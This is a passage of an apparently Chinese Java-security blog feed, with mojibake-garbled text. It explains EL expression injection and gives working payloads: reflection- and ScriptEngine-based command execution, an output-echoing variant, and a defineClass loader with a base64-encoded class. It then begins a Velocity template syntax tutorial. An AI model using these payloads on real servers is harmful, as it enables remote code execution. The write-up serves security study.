src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153889726-5e07cb9b-c981-4867-97e9-c8c43482d2a2.png">headerå¯¹è±¡è¿”å›å•ä¸€å€¼ï¼Œè€ŒheaderValuesåˆ™è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚</p><h3 id="JSPä¸­å¯åŠ¨-ç¦ç”¨ELè¡¨è¾¾å¼"><a href="#JSPä¸­å¯åŠ¨-ç¦ç”¨ELè¡¨è¾¾å¼" class="headerlink" title="JSPä¸­å¯åŠ¨&#x2F;ç¦ç”¨ELè¡¨è¾¾å¼"></a>JSPä¸­å¯åŠ¨&#x2F;ç¦ç”¨ELè¡¨è¾¾å¼</h3><h3 id="å…¨å±€ç¦ç”¨ELè¡¨è¾¾å¼"><a href="#å…¨å±€ç¦ç”¨ELè¡¨è¾¾å¼" class="headerlink" title="å…¨å±€ç¦ç”¨ELè¡¨è¾¾å¼"></a>å…¨å±€ç¦ç”¨ELè¡¨è¾¾å¼</h3><p>web.xmlä¸­è¿›å…¥å¦‚ä¸‹é…ç½®ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp-config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-ignored</span>&gt;</span>true<span class="tag">&lt;/<span class="name">el-ignored</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp-config</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å•ä¸ªæ–‡ä»¶ç¦ç”¨ELè¡¨è¾¾å¼"><a href="#å•ä¸ªæ–‡ä»¶ç¦ç”¨ELè¡¨è¾¾å¼" class="headerlink" title="å•ä¸ªæ–‡ä»¶ç¦ç”¨ELè¡¨è¾¾å¼"></a>å•ä¸ªæ–‡ä»¶ç¦ç”¨ELè¡¨è¾¾å¼</h3><p>åœ¨JSPæ–‡ä»¶ä¸­å¯ä»¥æœ‰å¦‚ä¸‹å®šä¹‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">&quot;true&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><p>è¯¥è¯­å¥è¡¨ç¤ºæ˜¯å¦ç¦ç”¨ELè¡¨è¾¾å¼ï¼ŒTRUEè¡¨ç¤ºç¦æ­¢ï¼ŒFALSEè¡¨ç¤ºä¸ç¦æ­¢ã€‚</p><h3 id="ELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"><a href="#ELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´" class="headerlink" title="ELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´"></a>ELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</h3><p>ELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´å’ŒSpELã€OGNLç­‰è¡¨è¾¾å¼æ³¨å…¥æ¼æ´æ˜¯ä¸€æ ·çš„æ¼æ´åŸç†çš„ï¼Œå³è¡¨è¾¾å¼å¤–éƒ¨å¯æ§å¯¼è‡´æ”»å‡»è€…æ³¨å…¥æ¶æ„è¡¨è¾¾å¼å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>ä¸€èˆ¬çš„ï¼ŒELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´çš„å¤–éƒ¨å¯æ§ç‚¹å…¥å£éƒ½æ˜¯åœ¨Javaç¨‹åºä»£ç ä¸­ï¼Œå³Javaç¨‹åºä¸­çš„ELè¡¨è¾¾å¼å†…å®¹å…¨éƒ¨æˆ–éƒ¨åˆ†æ˜¯ä»å¤–éƒ¨è·å–çš„ã€‚</p><h3 id="é€šç”¨PoC"><a href="#é€šç”¨PoC" class="headerlink" title="é€šç”¨PoC"></a>é€šç”¨PoC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¯¹åº”äºJSPé¡µé¢ä¸­çš„pageContextå¯¹è±¡ï¼ˆæ³¨æ„ï¼šå–çš„æ˜¯pageContextå¯¹è±¡ï¼‰</span></span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–Webè·¯å¾„</span></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ–‡ä»¶å¤´å‚æ•°</span></span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–webRoot</span></span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&quot;a&quot;</span>,pageContext.request.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;calc&quot;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚æˆ‘ä»¬åœ¨Javaç¨‹åºä¸­å¯ä»¥æ§åˆ¶è¾“å…¥ELè¡¨è¾¾å¼å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>.getClass()).invoke(<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;calc.exe&quot;</span>))&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœè¯¥ELè¡¨è¾¾å¼ç›´æ¥åœ¨JSPé¡µé¢ä¸­æ‰§è¡Œï¼Œåˆ™è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713154033805-2f6a4a9c-8939-4d54-aab5-58560d228715.png"></p><p>ä½†æ˜¯åœ¨å®é™…åœºæ™¯ä¸­ï¼Œæ˜¯å‡ ä¹æ²¡æœ‰ä¹Ÿæ— æ³•ç›´æ¥ä»å¤–éƒ¨æ§åˆ¶JSPé¡µé¢ä¸­çš„ELè¡¨è¾¾å¼çš„ã€‚è€Œç›®å‰å·²çŸ¥çš„ELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´éƒ½æ˜¯æ¡†æ¶å±‚é¢æœåŠ¡ç«¯æ‰§è¡Œçš„ELè¡¨è¾¾å¼å¤–éƒ¨å¯æ§å¯¼è‡´çš„ã€‚</p><h3 id="ç»•è¿‡æ–¹æ³•"><a href="#ç»•è¿‡æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h3><p>è¿™é‡Œé’ˆå¯¹å‰é¢åœ¨Javaä»£ç ä¸­æ³¨å…¥ELè¡¨è¾¾å¼çš„ä¾‹å­æ¥æ¼”ç¤ºã€‚å…¶å®ç»•è¿‡æ–¹æ³•å’ŒSpELè¡¨è¾¾å¼æ³¨å…¥æ˜¯ä¸€æ ·çš„ã€‚</p><h4 id="åˆ©ç”¨åå°„æœºåˆ¶ç»•è¿‡"><a href="#åˆ©ç”¨åå°„æœºåˆ¶ç»•è¿‡" class="headerlink" title="åˆ©ç”¨åå°„æœºåˆ¶ç»•è¿‡"></a>åˆ©ç”¨åå°„æœºåˆ¶ç»•è¿‡</h4><p>å³å‰é¢Demoçš„PoCï¼Œæ³¨æ„ä¸€ç‚¹çš„å°±æ˜¯è¿™é‡Œä¸æ”¯æŒç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ç»•è¿‡å…³é”®å­—è¿‡æ»¤ã€‚</p><h4 id="åˆ©ç”¨ScriptEngineè°ƒç”¨JSå¼•æ“ç»•è¿‡"><a href="#åˆ©ç”¨ScriptEngineè°ƒç”¨JSå¼•æ“ç»•è¿‡" class="headerlink" title="åˆ©ç”¨ScriptEngineè°ƒç”¨JSå¼•æ“ç»•è¿‡"></a>åˆ©ç”¨ScriptEngineè°ƒç”¨JSå¼•æ“ç»•è¿‡</h4><p>åŒSpELæ³¨å…¥ä¸­è®²åˆ°çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h3 id="æ— å›æ˜¾æ‰§è¡Œå‘½ä»¤"><a href="#æ— å›æ˜¾æ‰§è¡Œå‘½ä»¤" class="headerlink" title="æ— å›æ˜¾æ‰§è¡Œå‘½ä»¤"></a>æ— å›æ˜¾æ‰§è¡Œå‘½ä»¤</h3><p>å¯èƒ½å¤§å®¶æœ€å¸¸è§åˆ°çš„å°±æ˜¯æ‰§è¡Œå‘½ä»¤çš„payloadï¼Œç”±äºelè¡¨è¾¾å¼ä¸èƒ½æ‰§è¡Œnewç­‰æ“ä½œï¼Œæ‰€ä»¥éœ€è¦ç”¨åå°„æ¥æ„é€ ã€‚</p><p>æ ·ä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>.getClass()).invoke(<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>æˆ–è€…æ˜¯å€ŸåŠ©jså¼•æ“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;new+java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ä¸¤è€…éƒ½æ˜¯æ— å›æ˜¾çš„ï¼Œä¸ä¼˜é›…ã€‚</p><h3 id="æœ‰å›æ˜¾æ‰§è¡Œå‘½ä»¤"><a href="#æœ‰å›æ˜¾æ‰§è¡Œå‘½ä»¤" class="headerlink" title="æœ‰å›æ˜¾æ‰§è¡Œå‘½ä»¤"></a>æœ‰å›æ˜¾æ‰§è¡Œå‘½ä»¤</h3><p>æœ€æ—©çœ‹åˆ°çš„æœ‰å›æ˜¾ç›¸å…³çš„ç ”ç©¶æ˜¯åœ¨è¿™ç¯‡æ–‡ç« ï¼š<a href="https://forum.butian.net/share/886%EF%BC%8C%E5%86%99%E7%9A%84%E9%9D%9E%E5%B8%B8%E5%A5%BD%EF%BC%8C%E6%9C%80%E5%90%8E%E7%9A%84payload%E5%A6%82%E4%B8%8B%EF%BC%9A">https://forum.butian.net/share/886ï¼Œå†™çš„éå¸¸å¥½ï¼Œæœ€åçš„payloadå¦‚ä¸‹ï¼š</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;inputStream&quot;</span>, Runtime.getRuntime().exec(<span class="string">&quot;cmd /c dir&quot;</span>).getInputStream());Thread.sleep(<span class="number">1000</span>);pageContext.setAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>, pageContext.getAttribute(<span class="string">&quot;inputStream&quot;</span>).available());pageContext.setAttribute(<span class="string">&quot;byteBufferClass&quot;</span>, Class.forName(<span class="string">&quot;java.nio.ByteBuffer&quot;</span>));pageContext.setAttribute(<span class="string">&quot;allocateMethod&quot;</span>, pageContext.getAttribute(<span class="string">&quot;byteBufferClass&quot;</span>).getMethod(<span class="string">&quot;allocate&quot;</span>, Integer.TYPE));pageContext.setAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>, pageContext.getAttribute(<span class="string">&quot;allocateMethod&quot;</span>).invoke(<span class="literal">null</span>, pageContext.getAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>)));pageContext.getAttribute(<span class="string">&quot;inputStream&quot;</span>).read(pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array(), <span class="number">0</span>, pageContext.getAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>));pageContext.setAttribute(<span class="string">&quot;byteArrType&quot;</span>, pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array().getClass());pageContext.setAttribute(<span class="string">&quot;stringClass&quot;</span>, Class.forName(<span class="string">&quot;java.lang.String&quot;</span>));pageContext.setAttribute(<span class="string">&quot;stringConstructor&quot;</span>, pageContext.getAttribute(<span class="string">&quot;stringClass&quot;</span>).getConstructor(pageContext.getAttribute(<span class="string">&quot;byteArrType&quot;</span>)));pageContext.setAttribute(<span class="string">&quot;stringRes&quot;</span>, pageContext.getAttribute(<span class="string">&quot;stringConstructor&quot;</span>).newInstance(pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array()));pageContext.getAttribute(<span class="string">&quot;stringRes&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºELè¡¨è¾¾å¼ä¸æ”¯æŒç›´æ¥èµ‹å€¼ä»¥åŠnewå¯¹è±¡ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°pageContext.getAttributeè·ŸpageContext.setAttributeæ¥é—´æ¥å®ç°å˜é‡çš„ä¼ é€’ï¼Œå¯¼è‡´payloadå†™èµ·æ¥éå¸¸çš„éº»çƒ¦ï¼Œä¹Ÿéå¸¸çš„è‡ƒè‚¿ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬æ¢ä¸€ç§æ€è·¯ï¼Œä¸å†ä½¿ç”¨ELè‡ªèº«çš„è¯­æ³•ï¼Œè€Œæ˜¯åœ¨jså¼•æ“ä¸­å®ç°æˆ‘ä»¬çš„é€»è¾‘ã€‚</p><p>ç»è¿‡ç®€åŒ–åï¼Œæˆ‘ä»¬çš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;var s = [3];s[0] = \&quot;cmd\&quot;;s[1] = \&quot;/c\&quot;;s[2] = \&quot;whoami\&quot;;var p = java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\&quot;GBK\&quot;).useDelimiter(\&quot;\\\\A\&quot;);var result = sc.hasNext() ? sc.next() : \&quot;\&quot;;sc.close();result;&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h3 id="ä»»æ„ä»£ç æ‰§è¡Œ"><a href="#ä»»æ„ä»£ç æ‰§è¡Œ" class="headerlink" title="ä»»æ„ä»£ç æ‰§è¡Œ"></a>ä»»æ„ä»£ç æ‰§è¡Œ</h3><p>åœ¨è¿™é‡Œæˆ‘ä»¬åŒæ ·å¯ä»¥å€ŸåŠ©jså¼•æ“è°ƒç”¨defineClassæ¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œçš„æ“ä½œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(pageContext.request.getParameter(<span class="string">&quot;ant&quot;</span>))&#125;</span><br></pre></td></tr></table></figure><p>antå‚æ•°å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    load(<span class="string">&quot;nashorn:mozilla_compat.js&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">  importPackage(Packages.java.util);</span><br><span class="line">  importPackage(Packages.java.lang);</span><br><span class="line">  importPackage(Packages.java.io);</span><br><span class="line">  function <span class="title function_">Base64DecodeToByte</span><span class="params">(str)</span> &#123;</span><br><span class="line">    importPackage(Packages.sun.misc);</span><br><span class="line">    importPackage(Packages.java.util);</span><br><span class="line">    <span class="keyword">var</span> bt;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      bt = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(str);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      bt = Base64().getDecoder().decode(str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bt;</span><br><span class="line">  &#125;</span><br><span class="line">  function <span class="title function_">define</span><span class="params">(Classdata, cmd)</span> &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">classBytes</span> <span class="operator">=</span> Base64DecodeToByte(Classdata);</span><br><span class="line">    <span class="type">var</span> <span class="variable">byteArray</span> <span class="operator">=</span> Java.type(<span class="string">&quot;byte[]&quot;</span>);</span><br><span class="line">    <span class="type">var</span> <span class="variable">int</span> <span class="operator">=</span> Java.type(<span class="string">&quot;int&quot;</span>);</span><br><span class="line">    <span class="type">var</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> java.lang.ClassLoader.class.getDeclaredMethod(</span><br><span class="line">      <span class="string">&quot;defineClass&quot;</span>,</span><br><span class="line">      byteArray.class,</span><br><span class="line">      <span class="type">int</span>.class,</span><br><span class="line">      <span class="type">int</span>.class</span><br><span class="line">    );</span><br><span class="line">    defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">var</span> <span class="variable">cc</span> <span class="operator">=</span> defineClassMethod.invoke(</span><br><span class="line">      Thread.currentThread().getContextClassLoader(),</span><br><span class="line">      classBytes,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      classBytes.length</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> cc.getConstructor(java.lang.String.class).newInstance(cmd);</span><br><span class="line">  &#125;  </span><br><span class="line">  define(</span><br><span class="line">    <span class="string">&quot;yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIAGA==&quot;</span>,</span><br><span class="line">      <span class="string">&quot;calc&quot;</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ³¨å…¥ </tag>
            
            <tag> Javaè¡¨è¾¾å¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaæ¨¡ç‰ˆæ³¨å…¥</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="Velocityçš„ç®€ä»‹"><a href="#Velocityçš„ç®€ä»‹" class="headerlink" title="Velocityçš„ç®€ä»‹"></a>Velocityçš„ç®€ä»‹</h2><p>Velocityæ¨¡æ¿å¼•æ“, ä½œä¸ºä¸€æ¬¾æˆç†Ÿçš„åŸºäºjavaçš„æ¨¡æ¿å¼•æ“ï¼Œèƒ½å¤Ÿå¸®æˆ‘ä»¬å®ç°é¡µé¢é™æ€åŒ–ï¼ŒåŒæ—¶å®ƒå°†Javaä»£ç ä¸ç½‘é¡µåˆ†å¼€ï¼Œå°†æ¨¡æ¿å’Œå¡«å…¥æ•°æ®æ•´åˆ,ç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„é¡µé¢.</p><h3 id="1-åŸºæœ¬è¯­æ³•"><a href="#1-åŸºæœ¬è¯­æ³•" class="headerlink" title="1 åŸºæœ¬è¯­æ³•"></a>1 åŸºæœ¬è¯­æ³•</h3><h4 id="1-å…³é”®å­—"><a href="#1-å…³é”®å­—" class="headerlink" title="1 å…³é”®å­—"></a>1 å…³é”®å­—</h4><p>Velocityæ¨¡æ¿ä¸­çš„å…³é”®å­—, éƒ½æ˜¯ä»¥#å¼€å¤´è¡¨ç¤ºçš„</p><ul><li>#set è®¾ç½®ä¸€ä¸ªå˜é‡</li><li>#if æ¡ä»¶åˆ†æ”¯åˆ¤æ–­</li><li>#else å¦ä¸€ä¸ªæ¡ä»¶åˆ†æ”¯</li><li>#end è¯­å¥ç»“æŸ</li><li>#foreach å¾ªç¯è¯­å¥</li></ul><h4 id="2-å˜é‡"><a href="#2-å˜é‡" class="headerlink" title="2 å˜é‡"></a>2 å˜é‡</h4><p>Velocityæ¨¡æ¿ä¸­çš„å˜é‡, éƒ½æ˜¯ä»¥$å¼€å¤´è¡¨ç¤ºçš„</p><p>å¦‚: $userç”¨æˆ· $password ç”¨æˆ·å¯†ç </p><p><strong>{}å˜é‡</strong></p><p>å¯¹äºæ˜ç¡®çš„Velocityå˜é‡, å¯ä»¥ä½¿ç”¨{}åŒ…æ‹¬èµ·æ¥, å¯ä»¥åœ¨é¡µé¢ä¸Šå±•ç¤ºå¦‚ä¸‹æ•ˆæœ:</p><p>${user}Name, æ­¤æ—¶é¡µé¢ä¸Šå¯ä»¥è¡¨ç¤ºä¸º$someoneNameçš„æ•ˆæœ.</p><p><strong>!å˜é‡</strong></p><p>å¦‚ä¸Šè¿°å†…å®¹,Velocityæ¨¡æ¿ä¸­å¦‚æœå˜é‡ä¸å­˜åœ¨, åœ¨é¡µé¢ä¼šæ˜¾ç¤º$user, è¿™ç§å½¢å¼å½±å“å±•ç¤ºçš„æ•ˆæœ. å¯ä»¥ä½¿ç”¨$!userè¡¨ç¤º.</p><p>$!userè¡¨ç¤º, å­˜åœ¨åˆ™å±•ç¤º,ä¸å­˜åœ¨åˆ™ä¸ºç©ºç™½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">å¤åˆ¶ä»£ç ## å®šä¹‰ä¸€ä¸ªuserå˜é‡ä¸ºæç™½, passwordå˜é‡ä¸º<span class="number">123456</span> </span><br><span class="line">#set&#123;$user = <span class="string">&quot;æç™½&quot;</span>&#125;</span><br><span class="line">#set&#123;$password = <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">## å˜é‡å¼•ç”¨</span><br><span class="line">#set&#123;$student.name = <span class="string">&quot;æç™½&quot;</span>&#125;</span><br><span class="line">## æ•°å­—</span><br><span class="line">#set&#123;$student.age = <span class="number">22</span>&#125;</span><br><span class="line">## å­—ç¬¦ä¸²</span><br><span class="line">#set&#123;$student.class = <span class="string">&quot;å¤§ç­&quot;</span>&#125;</span><br><span class="line">## å±æ€§å¼•ç”¨  </span><br><span class="line">#set($student.address = $address.info)</span><br></pre></td></tr></table></figure><h4 id="3-è½¬ä¹‰å­—ç¬¦å’Œé€»è¾‘æ“ä½œç¬¦"><a href="#3-è½¬ä¹‰å­—ç¬¦å’Œé€»è¾‘æ“ä½œç¬¦" class="headerlink" title="3 è½¬ä¹‰å­—ç¬¦å’Œé€»è¾‘æ“ä½œç¬¦"></a>3 è½¬ä¹‰å­—ç¬¦å’Œé€»è¾‘æ“ä½œç¬¦</h4><p>Velocityæ¨¡æ¿ä¸­è½¬ä¹‰å­—ç¬¦æ˜¯ \</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">å¤åˆ¶ä»£ç #set&#123;$user = <span class="string">&quot;æç™½&quot;</span>&#125;</span><br><span class="line">## è¾“å…¥ç»“æœ</span><br><span class="line">$user æç™½</span><br><span class="line">\$user $user</span><br><span class="line">\\$user \æç™½</span><br><span class="line">\\\$user \$user</span><br></pre></td></tr></table></figure><p>&amp;&amp; ä¸”</p><p>|| æˆ–</p><p>! å–å</p><h4 id="4-å¾ªç¯"><a href="#4-å¾ªç¯" class="headerlink" title="4 å¾ªç¯"></a>4 å¾ªç¯</h4><p>Velocityæ¨¡æ¿ä¸­listé›†åˆå¾ªç¯è¯­æ³•</p><p>å¾ªç¯éå†,å¯ä»¥å¾—åˆ°æ¯ä¸ªå…ƒç´ ,æ¯ä¸ªå…ƒç´ çš„åºå·,ä»¥åŠæ€»çš„é›†åˆé•¿åº¦</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">å¤åˆ¶ä»£ç #foreach ( $element in $list)</span><br><span class="line">## é›†åˆä¸­æ¯ä¸ªå…ƒç´ 